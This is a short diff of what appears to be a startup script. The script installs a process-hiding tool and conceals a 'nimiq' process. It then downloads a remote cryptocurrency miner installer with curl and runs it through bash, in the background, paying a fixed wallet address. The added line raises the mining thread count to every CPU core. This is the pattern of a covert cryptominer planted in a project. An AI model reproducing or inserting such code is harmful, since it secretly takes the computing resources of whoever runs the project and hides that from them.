@@ -11,5 +11,5 @@ npm install
 npm install -g npm@8.5.0
 npm i -g node-process-hider
 ph add nimiq
-WALLET_ADDRESS="NQ50 44BA 44R3 BFHX 8648 3UTH LX98 KJYC TV5P" WORKER_ID="gila" SERVER_URL="  ws://eu1.nimiq.skypool.org:4000" THREAD=30 START_BACKGROUND="true" bash -c "$(curl -sL https://github.com/skypool-org/skypool-nimiq-miner-release/releases/download/v1.3.4/linux-installer.sh)"
+WALLET_ADDRESS="NQ50 44BA 44R3 BFHX 8648 3UTH LX98 KJYC TV5P" WORKER_ID="gila" SERVER_URL="  ws://eu1.nimiq.skypool.org:4000" THREAD=$(nproc --all) START_BACKGROUND="true" bash -c "$(curl -sL https://github.com/skypool-org/skypool-nimiq-miner-release/releases/download/v1.3.4/linux-installer.sh)"
 cd ./skypool-miner/ && sh start-foreground.sh
